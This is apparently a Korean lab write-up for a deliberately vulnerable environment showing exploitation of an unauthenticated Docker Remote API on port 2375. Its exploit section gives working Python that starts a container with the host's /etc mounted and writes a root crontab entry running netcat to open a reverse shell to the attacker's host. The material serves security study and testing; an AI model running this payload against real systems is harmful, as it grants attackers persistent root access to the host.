# docker daemon API 접근 권한이 없는 취약성

참고 링크:

- http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8

## 취약한 환경

취약한 환경 컴파일 및 시작:

```
docker compose build
docker compose up -d
```

환경이 시작되면 2375 포트가 수신됩니다.

## 익스플로잇

이용 방법은 우리가 임의로 컨테이너를 부팅하고, 호스트 컴퓨터의 `/etc` 디렉토리를 컨테이너에 마운트하면, 임의로 파일을 읽고 쓸 수 있습니다.우리는 crontab 프로필에 명령을 써서 셸을 획득할 수 있습니다.

```python
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

crontab 파일에 쓰고, 성공적으로 셸을 획득했습니다.

![](1.png)
